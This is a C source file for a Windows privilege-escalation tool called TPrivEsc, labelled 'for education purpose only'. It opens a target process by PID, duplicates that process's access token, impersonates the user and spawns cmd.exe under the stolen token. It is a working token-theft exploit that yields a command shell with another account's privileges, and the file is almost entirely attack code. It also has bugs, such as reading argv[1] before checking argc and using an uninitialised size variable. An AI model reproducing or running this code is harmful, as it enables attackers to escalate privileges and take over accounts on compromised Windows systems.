/*
Code written by Whiteheart for education purpose only.

If You are getting Error 1314 while create new process, open the Control Panel 
Administrative Tools / Local Security Policy and add the user account to the "Replace a process level token" right.

*/
#include<windows.h>
#include<stdio.h>

int main (int argc, LPCSTR argv[])
{
    DWORD pid = atoi (argv[1]); 
    if (argc != 2)
    {   printf ("==============================");
        printf ("\nUsage :: TPrivEsc <PID>\n");
        printf ("==============================\n");
        return 3;
    }
    printf("\n===Code Written By Whiteheart===\n");
    
    //opening Remote Process Token
    HANDLE rProcess2 = OpenProcess(PROCESS_QUERY_INFORMATION,TRUE,pid );
    if (!rProcess2)
    {
        printf ("\n+++++++++++++++++++++++++\nUnable to open process ID %d \n",pid);
        return 5;
    }
    printf ("\n+++++++++++++++++++++++++\nRemote Process is opened\n");

    HANDLE pToken ; 

    BOOL tResult = OpenProcessToken (rProcess2,TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE,&pToken);
    if (!tResult)
    {
        printf ("\n+++++++++++++++++++++++++\nUnbale to open process token!!!\n"); 
        return 6;
    }
    printf("\n+++++++++++++++++++++++++\nProcess Token Opened Succesfully\nPid :: %d \n",pid);

    //These are required to call DuplicateTokenEx.
    SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE pNewToken = new HANDLE;
     
    if (!DuplicateTokenEx(pToken,MAXIMUM_ALLOWED, NULL,seImpersonateLevel, tokenType,&pNewToken))
        {
            printf ("\n+++++++++++++++++++++++++\nUnable to Duplicate Token Error:: %d\n", GetLastError());
            return 7;
        }
    printf("\n+++++++++++++++++++++++++\nToken Is Duplicated Successfully!!!\n");

    // Getting Session and owner of the token 
    DWORD tInfo ;
    DWORD szInfo;
    GetTokenInformation(pNewToken,TokenSessionId,&tInfo,szInfo,&szInfo);
    printf("Session ID is:: %d",tInfo);
    BOOL bResult = ImpersonateLoggedOnUser(pNewToken);
    if (!bResult) printf ("\nUnbale To Impersonate User\n");

    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};
    //CreateProcessWithTokenW(pNewToken,LOGON_NETCREDENTIALS_ONLY,L"C:\\Windows\\System32\\cmd.exe",NULL,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi);
 if (!CreateProcessAsUserA(pNewToken,NULL,"C:\\Windows\\system32\\cmd.exe",NULL,NULL,TRUE,CREATE_NEW_CONSOLE,NULL,"c:\\windows\\system32",&si,&pi))
    {
        printf ("\n UNABLE CREATE NEW PROCESS\n ERROR:: %d",GetLastError());
        return 9;
    }
CloseHandle (rProcess2);
CloseHandle(pNewToken);
CloseHandle(pToken);
return 0;
}
